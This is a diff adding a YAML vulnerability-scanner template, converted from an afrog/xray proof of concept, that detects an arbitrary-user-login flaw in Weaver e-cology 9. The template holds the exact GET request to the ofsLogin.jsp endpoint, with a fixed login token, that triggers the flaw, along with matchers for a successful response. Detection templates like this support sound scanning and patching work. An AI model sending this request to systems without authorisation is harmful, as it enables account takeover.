@@ -1,0 +1,26 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - location.replace('/wui/index.html');
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168'
+id: ecology-ofslogin-aul
+info:
+  author: Chaitin
+  description: 泛微e-cology9中存在信息泄露及任意用户登录漏洞，远程攻击者可利用两个漏洞组合任意登录系统中的用户
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 泛微 e-cology 任意用户登录漏洞
+  severity: high
+  tags: ecology,argus-import
